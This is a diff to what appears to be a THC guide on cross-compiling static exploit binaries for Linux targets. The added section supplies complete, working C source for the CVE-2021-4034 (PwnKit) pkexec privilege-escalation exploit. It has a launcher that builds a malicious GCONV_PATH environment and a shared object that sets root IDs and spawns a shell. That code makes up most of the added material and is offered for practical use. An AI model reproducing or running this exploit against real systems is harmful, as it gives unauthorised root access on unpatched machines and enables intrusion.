@@ -1,6 +1,5 @@
 
-## TL;DR: Use ```docker run muslcc/x86_64:armv6-linux-musleabi``` and ```gcc -static```.
-
+### TL;DR: Use ```docker run muslcc/x86_64:armv6-linux-musleabi``` and ```gcc -static```.
 
 It is not always possible to compile an exploit on the target system. Here at THC we use various methods to cross-compile static Linux binaries. I'll explain some of our methods.
 
@@ -66,16 +65,45 @@ apk update \
 && gcc -I/src/usr/include -L/src/usr/lib -pthread dirty.c -o dirty-exp -lcrypt -lcrypto -lssl -static
 ```
 
-## Exploits load .so files
+## Exploits that need .so files
 
-There is an exception to the above when exploit can not be compiled statically.
+Some exploits can not be compiled statically.
 
-For example exploits that compile .so dynamic shared object files that are loaded by the vulnerable program (and by definition can not be static). It is not possible to cross-compile them either as they heavily depend on the ABI of the target system.
+For example exploits that compile .so dynamic shared object files that need to be loaded by the vulnerable program. It is not possible to cross-compile them either as the .so files heavily depend on the ABI of the target system.
 
-Or exploits that during their exploitation phase compile other binaries.
+A good example is [CVE-2021-4034](https://github.com/arthepsy/CVE-2021-4034/) also known as polkit/pkexec exploit. The exploit compiles more source during runtime _and_ requires the vulnerable program to load the just compiled .so file.
 
-A good example is (CVE-2021-4034)[https://github.com/arthepsy/CVE-2021-4034/] also known as polkit/pkexec exploit. It requires the vulnerable program to load a .so file _and_ it compiles more source during runtime.
+There are better exploits around but for what we like to showcase the reference exploit [cve-2021-4043-poc.c](https://github.com/arthepsy/CVE-2021-4034/blob/main/cve-2021-4034-poc.c) is just perfect.
+
+We modify the original exploit in two ways:
+1. We split it into two separate .c files.
+1. We copy the pre-compiled .so file instead of compiling it at runtime.
 
 
-        
+thc-polkit.c
+```C
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+int main(int argc, char *argv[]) {
+	system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'");
+	system("mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules");
+	system("cp pwnkit.so pwnkit/pwnkit.so");
+	char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL };
+	execve("/usr/bin/pkexec", (char*[]){NULL}, env);
+}
+```
 
+pwnkit.c
+```C
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void gconv() {}
+void gconv_init() {
+	setuid(0); setgid(0);
+	seteuid(0); setegid(0);
+	system("export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh");
+}
+```
